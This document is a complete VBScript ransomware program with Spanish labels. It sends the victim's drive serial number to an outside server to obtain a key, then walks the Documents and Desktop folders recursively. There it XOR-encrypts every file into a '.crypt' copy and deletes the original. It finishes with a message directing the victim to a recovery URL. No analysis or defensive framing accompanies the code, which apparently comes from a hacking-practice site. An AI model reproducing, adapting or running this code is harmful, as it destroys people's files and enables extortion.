option explicit
dim shell,fso,document,f,password,desktop,id
 
set shell = createobject("wscript.shell")
set fso = createobject("scripting.filesystemobject")
 
document = shell.SpecialFolders("MyDocuments")
desktop = shell.SpecialFolders("Desktop")
 
set f = fso.getfolder(document)
id = f.drive.serialnumber 
 
password = Contrasena(id)
 
cifrar(document)
cifrar(desktop)
 
msgbox "Para Recuperar Tus Archivos Ingresa a La Direccion:" & vbcrlf & vbcrlf & "http://practicashacking.net23.net/ransomware/Recover.php" & vbcrlf & vbcrlf & "Tu ID Es: " & id,,"Programa Finalizado" 
 
function Contrasena(id)
  dim objhttp
  Set objhttp = createobject("Microsoft.XmlHttp")
 
  objhttp.open "POST","http://practicashacking.net23.net/ransomware/index.php",false
  objhttp.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
  objhttp.send "id=" & id
 
  Contrasena = objhttp.responsetext
end function
 
function cifrar(ruta)
   dim carpeta,listfiles,listfolders,f
 
   set carpeta = fso.getfolder(ruta)
   set listfolders = carpeta.subfolders
   set listfiles = carpeta.files
 
   for each f in listfiles
      archivo(f.path)
   next 
 
   for each f in listfolders
      cifrar(f.path)
   next   
end function
 
function archivo(path)
   dim file,largo,i,f,b,p,n
 
   set file = fso.getfile(path)
 
   largo=file.size 
 
   set f = file.OpenAsTextStream()
   redim bytes(largo)
 
   n = 1 
 
   for i=0 to largo - 1
      if n = len(password) then 
	     n = 1
	  else
         n = n + 1	  
      end if	  
	  p = asc(mid(password,n,1))
      b = asc(f.read(1)) xor p
	  bytes(i) = chr(b)
   next 
 
   f.close  
 
   set f = fso.createtextfile(file.path & ".crypt") 
 
   for n = 0 to i - 1
      f.write(bytes(n))
   next
 
   f.close 
   file.delete
end function
